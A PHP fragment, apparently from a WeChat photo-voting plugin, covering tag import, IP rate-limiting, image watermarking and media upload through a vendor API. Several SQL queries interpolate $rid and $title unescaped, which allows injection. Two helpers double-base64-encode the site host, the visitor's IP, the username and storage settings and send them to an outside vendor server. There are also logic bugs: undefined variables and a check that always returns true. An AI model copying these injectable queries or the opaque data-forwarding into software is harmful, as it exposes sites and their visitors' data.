						}else{
							$tag = pdo_fetch("SELECT id FROM ".tablename($this->table_tags)." WHERE rid = '{$rid}' AND icon = 1 ORDER BY id DESC LIMIT 1 ");
							$parentid = $tag['id'];
							$icon = '2';
						}
					}else{
						$parentid = '';
						$icon = '1';

					}
					$tags = pdo_fetch("SELECT id FROM ".tablename($this->table_tags)." WHERE rid = '{$rid}' AND title = '{$title}' AND icon < 3 LIMIT 1 ");

					if (empty($tags)) {
						$data = array(
							'rid' => $rid,
							'uniacid' => $uniacid,
							'displayorder' => $displayorder,
							'title' => $title,
							'parentid' => $parentid,
							'icon' => $icon,
							'createtime' => time(),
						);
						pdo_insert($this->table_tags, $data);
					}else{
						$msg =  '分组名称重复！';
					}

				}
			}
		}else	{
		   $msg = "导入失败！";
		}
		return $msg;
	}

	public function stopip($rid, $uniacid, $from_user,$mineip, $do, $ipturl = '0', $limitip = '2') {
		$starttime=mktime(0,0,0);//当天：00：00：00
		$endtime = mktime(23,59,59);//当天：23：59：59
		$times = '';
		$times .= ' AND createtime >=' .$starttime;
		$times .= ' AND createtime <=' .$endtime;
		$iplist = pdo_fetchall('SELECT * FROM '.tablename($this->table_iplist).' WHERE rid= :rid order by `createtime` desc ', array(':rid' => $rid));
		$totalip = pdo_fetchcolumn('SELECT COUNT(1) FROM '.tablename($this->table_log).' WHERE rid= :rid AND ip = :ip '.$times.'  order by `ip` desc ', array(':rid' => $rid, ':ip' => $mineip));
		if ($totalip > $limitip && $ipturl == 1) {
			$ipurl = $_W['siteroot'] . $this->createMobileUrl('stopip', array('from_user' => $from_user, 'rid' => $rid));
			header("location:$ipurl");
			exit();
		}
		$totalip = pdo_fetchcolumn('SELECT COUNT(1) FROM '.tablename($this->table_log).' WHERE rid= :rid AND ip = :ip  '.$times.' order by `ip` desc ', array(':rid' => $rid, ':ip' => $mineip));

		$mineipz = sprintf("%u",ip2long($mineip));


		foreach ($iplist as $i) {
			$iparrs = iunserializer($i['iparr']);
			$ipstart = sprintf("%u",ip2long($iparrs['ipstart']));
			$ipend = sprintf("%u",ip2long($iparrs['ipend']));


			if ($mineipz >= $ipstart && $mineipz <= $ipend) {
				$ipdate = array(
					'rid' => $rid,
					'uniacid' => $uniacid,
					'avatar' => $avatar,
					'nickname' => $nickname,
					'from_user' => $from_user,
					'ip' => $mineip,
					'hitym' => $do,
					'createtime' => time(),
				);
				$ipdate['iparr'] = getiparr($ipdate['ip']);
				pdo_insert($this->table_iplistlog, $ipdate);

				if ($ipturl == 1) {
					$ipurl = $_W['siteroot'] . $this->createMobileUrl('stopip', array('from_user' => $from_user, 'rid' => $rid));
					header("location:$ipurl");
					exit();
				}
				break;
			}
		}
	}
/*
******************************************************fmoons.com*********************************
* FantasyMoons
* 2010-12-06 17:07
* 图片合成函数
* 函数名 WaterPoster
* $groundimage     背景图片，即需要加水印的图片，支持gif,jpg,png,bmp格式；
* $saveurl     图片存放地址
* $markimage       图片水印，即作为水印的图片，只支持GIF,JPG,PNG格式*
* $markwidthaterPos 水印位置，有10种状态，默认为0，0为随机位置；
* 	1为顶端居左，2为顶端居中，3为顶端居右；
* 	4为中部居左，5为中部居中，6为中部居右；
* 	7为底端居左，8为底端居中，9为底端居右；

* $marktext        文字水印，即把文字作为为水印，支持中文,默认为C:\WINDOWS\Fonts/simhei.ttf(黑体)；
* $fontsize        文字大小，值为1、2、3......23、24、25，默认为15；
* $fontcolor       文字颜色，值为十六进制颜色值，默认为#FF0000(红色)；
* $marktype        水印类型，0为图片，1为文字，默认为0(图片)；
*****************************************************************************************************
*/

	public function WaterPoster($saveurl, $groundimage, $markimage, $markminwidth, $markminheight, $markwhere='0', $markwheret='0', $marktext='fmoons.com',$fontfamily='黑体', $fontsize='15', $fontcolor="#000", $marktype=0,$marktypet=0)
{
	//配置水印图片文件
	/**if(!file_exists($markimage))
		$markimage = '../addons/fm_photosvote/static/logo.png';
	else if(!file_exists($markimage))
		$marktype = '1';**/

	//print_r($marktype);

	//读取水印文件
	if(($marktype == 0))
	{
		//echo '1';
		$markimage_info   = getimagesize($markimage);
		$markimage_width  = $markimage_info[0]; //取得水印图片的宽
		$markimage_height = $markimage_info[1]; //取得水印图片的高
		switch($markimage_info[2]) //取得水印图片的格式
		{
			case 1:
				$from_markimage = imagecreatefromgif($markimage);
				break;
			case 2:
				$from_markimage = imagecreatefromjpeg($markimage);
				break;
			case 3:
				$from_markimage = imagecreatefrompng($markimage);
				break;
			case 4:
				$from_markimage = imagecreatefromwbmp($markimage);
				break;
			default:
				break;
		}
	}


	//读取背景图片
	if(!empty($groundimage))
	{
		$groundimage_info   = @getimagesize($groundimage);
		$groundimage_width  = $groundimage_info[0];
		$groundimage_height = $groundimage_info[1];
		switch($groundimage_info[2])
		{
			case 1:
				$from_groundimage = imagecreatefromgif($groundimage);
				break;
			case 2:
				$from_groundimage = imagecreatefromjpeg($groundimage);
				break;
			case 3:
				$from_groundimage = imagecreatefrompng($groundimage);
				break;
			case 4:
				$from_groundimage = imagecreatefromwbmp($groundimage);
				break;
			default:
				break;
		}
	}

	if($groundimage_width >= $markminwidth &&
	   $groundimage_height >= $markminheight)
	{

		//水印位置
		if($marktype == 0)
		{
			$markwidth  = $markimage_width;
			$markheight = $markimage_height;
		}
		if($marktypet == 0)
		{
			//取得使用 TrueType 字体的文本的范围
			$temp = @imagettfbbox($fontsize, 0, $fontfamily, $marktext);

			$text_markwidth  = $temp[2] - $temp[6];
			$text_markheight = $temp[3] - $temp[7];
			unset($temp);//释放内存
		}


		//设定图像的混色模式
		imagealphablending($from_groundimage, true);

		if($marktype == 0) //图片水印
		{
			switch($markwhere)
			{
				case 0://随机
					$pos_x = rand(0,($groundimage_width - $markwidth - 10));
					$pos_y = rand(0,($groundimage_height - $markheight - 10));
					break;
				case 1://1为顶端居左
					$pos_x = 10;
					$pos_y = 10;
					break;
				case 2://2为顶端居中
					$pos_x = ceil(($groundimage_width - $markwidth) / 2);
					$pos_y = 10;
					break;
				case 3://3为顶端居右
					$pos_x = ceil($groundimage_width - $markwidth - 10);
					$pos_y = 10;
					break;
				case 4://4为中部居左
					$pos_x = 10;
					$pos_y = ceil(($groundimage_height - $markheight) / 2);
					break;
				case 5://5为中部居中
					$pos_x = ceil(($groundimage_width - $markwidth) / 2);
					$pos_y = ceil(($groundimage_height - $markheight) / 2);
					break;
				case 6://6为中部居右
					$pos_x = ceil($groundimage_width - $markwidth - 10);
					$pos_y = ceil(($groundimage_height - $markheight) / 2);
					break;
				case 7://7为底端居左
					$pos_x = 10;
					$pos_y = ceil($groundimage_height - $markheight);
					break;
				case 8://8为底端居中
					$pos_x = ceil(($groundimage_width - $markwidth) / 2);
					$pos_y = ceil($groundimage_height - $markheight - 10);
					break;
				case 9://9为底端居右
					$pos_x = ceil($groundimage_width - $markwidth - 10);
					$pos_y = ceil($groundimage_height - $markheight - 10);
					break;
				default://默认随机
					$pos_x = rand(0,($groundimage_width - $markwidth - 10));
					$pos_y = rand(0,($groundimage_height - $markheight - 10));
					break;
			}
			imagecopy($from_groundimage, $from_markimage, $pos_x, $pos_y, 0, 0, $markimage_width, $markimage_height); //拷贝水印到目标文件
		}

		//文字水印
		if($marktypet == 0) //文字水印
		{
			switch($markwheret)
			{
				case 0://随机
					$pos_x_t = mt_rand(10,($groundimage_width - $text_markwidth - 10));
					$pos_y_t = mt_rand(10,($groundimage_height - $text_markheight - 10));
					break;
				case 1://1为顶端居左
					$pos_x_t = 10;
					$pos_y_t = 30;
					break;
				case 2://2为顶端居中
					$pos_x_t = ($groundimage_width / 2) - ($text_markwidth / 2);
					$pos_y_t = 30;
					break;
				case 3://3为顶端居右
					$pos_x_t = $groundimage_width - $text_markwidth - 10;
					$pos_y_t = 30;
					break;
				case 4://4为中部居左
					$pos_x_t = 10;
					$pos_y_t = ($groundimage_height / 2) - ($text_markheight / 2);
					break;
				case 5://5为中部居中
					$pos_x_t = ($groundimage_width / 2) - ($text_markwidth / 2);
					$pos_y_t = ($groundimage_height / 2) - ($text_markheight / 2);
					break;
				case 6://6为中部居右
					$pos_x_t = $groundimage_width - $text_markwidth - 10;
					$pos_y_t = ($groundimage_height / 2) - ($text_markheight / 2);
					break;
				case 7://7为底端居左
					$pos_x_t = 10;
					$pos_y_t = $groundimage_height - $text_markheight + 5;
					break;
				case 8://8为底端居中
					$pos_x_t = ($groundimage_width / 2) - ($text_markwidth / 2);
					$pos_y_t = $groundimage_height - $text_markheight + 5;
					break;
				case 9://9为底端居右
					$pos_x_t = $groundimage_width - $text_markwidth - 10;
					$pos_y_t = $groundimage_height - $text_markheight - 5;
					break;
				default://默认随机
					$pos_x_t = mt_rand(10,($groundimage_width - $text_markwidth - 10));
					$pos_y_t = mt_rand(10,($groundimage_height - $text_markheight - 10));
					break;
				}

				//获取水印文字颜色
				if(!empty($fontcolor) && (strlen($fontcolor) == 7))
				{
					$R = hexdec(substr($fontcolor, 1, 2));
					$G = hexdec(substr($fontcolor, 3, 2));
					$B = hexdec(substr($fontcolor, 5));
				}
				else if(!empty($fontcolor) && (strlen($fontcolor) == 3))
				{
					$R = hexdec(substr($fontcolor, 1, 1));
					$G = hexdec(substr($fontcolor, 2, 2));
					$B = hexdec(substr($fontcolor, 3, 3));
				}
				else
				{
					$R = '00';
					$G = '00';
					$B = '00';
				}

				//转换编码防止中文乱码
				//$marktext = mb_convert_encoding($marktext, 'UTF-8', 'GB2312');

				//把生成的文字区域写入到图片文件里
				imagettftext($from_groundimage, $fontsize, 0 , $pos_x_t, $pos_y_t, imagecolorallocate($from_groundimage,$R,$G,$B), $fontfamily, $marktext);
		}

		//取得背景图片的格式
		switch($groundimage_info[2])
		{
			case 1:
				//header('Content-type: image/gif');
				imagegif($from_groundimage, $saveurl); //第三个参数为生成带水印的图像质量 100 为最高
				break;
			case 2:
				//header('Content-type: image/jpeg');
				imagejpeg($from_groundimage, $saveurl, 100);
				break;
			case 3:
				//header('Content-type: image/png');
				imagepng($from_groundimage, $saveurl);
				break;
			case 4:
				//header('Content-type: image/vnd.wap.wbmp');
				imagewbmp($from_groundimage, $saveurl);
				break;
			default:
				break;
		}
	}

	//释放内存
	if(isset($markimage_info))   unset($markimage_info);
	if(isset($groundimage_info)) unset($groundimage_info);
	//header("Content-type: image/jpg");
	//释放与image关联的内存
	if(isset($from_markimage))   imagedestroy($from_markimage);
	if(isset($from_groundimage)) imagedestroy($from_groundimage);
	//return $from_groundimage;
}
	function fmqnimages($nfilename, $qiniu, $mid, $username) {
		$fmurl = 'http://api.fmoons.com/api/qiniu/api.php?';
		$hosts = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
		$host = base64_encode($hosts);

		$visitorsip = base64_encode(getip());

		$fmimages = array(
			'nfilename' => $nfilename,
			'qiniu' => $qiniu,
			'mid' => $mid,
			'username' => $username,
		);

		$fmimages =  base64_encode(base64_encode(iserializer($fmimages)));

		$fmpost = $fmurl.'host='.$host."&visitorsip=" . $visitorsip."&webname=" . $webname."&fmimages=".$fmimages;

		load()->func('communication');
		$content = ihttp_get($fmpost);
		$fmmv = @json_decode($content['content'], true);

		if ($mid == 0) {

			$fmdata = array(
				"success" => $fmmv['success'],
				"msg" =>$fmmv['msg'],
			);
			$fmdata['mid'] == 0;
			$fmdata['imgurl'] = $fmmv['imgurl'];

			return $fmdata;
			exit;

		}else{
			$fmdata = array(
				"success" => $fmmv['success'],
				"msg" => $fmmv['msg'],
			);
			$fmdata['picarr_'.$mid] = $fmmv['picarr_'.$mid];
			return $fmdata;
			exit;
		}
		//return $fmmv;
	}
	function fmqnaudios($nfilename, $qiniu, $upmediatmp, $audiotype, $username) {
		$fmurl = 'http://api.fmoons.com/api/qiniu/api.php?';
		$host = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
		$host = base64_encode($host);
		$clientip = base64_encode($_W['clientip']);

		$fmaudios = array(
			'nfilename' => $nfilename,
			'qiniu' => $qiniu,
			'upmediatmp' => $upmediatmp,
			'audiotype' => $audiotype,
			'username' => $username,
		);
		$fmaudios =  base64_encode(base64_encode(iserializer($fmaudios)));

		$fmpost = $fmurl.'host='.$host."&visitorsip=" . $clientip."&fmaudios=".$fmaudios;


		load()->func('communication');
		$content = ihttp_get($fmpost);
		$fmmv = @json_decode($content['content'], true);

		$fmdata = array(
			"msg" => $fmmv['msg'],
			"success" => $fmmv['success'],
			"nfilenamefop" => $fmmv['nfilenamefop'],
			"ret" => $fmmv['ret'],
		);
		$fmdata[$audiotype] = $fmmv[$audiotype];

		return $fmdata;
		exit();

	}
	public function is_weixin() {
		global $_W;
		if (empty($_SERVER['HTTP_USER_AGENT']) || strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') === false && strpos($_SERVER['HTTP_USER_AGENT'], 'Windows Phone') === false) {
			return true;
		}
		return true;
	}

}
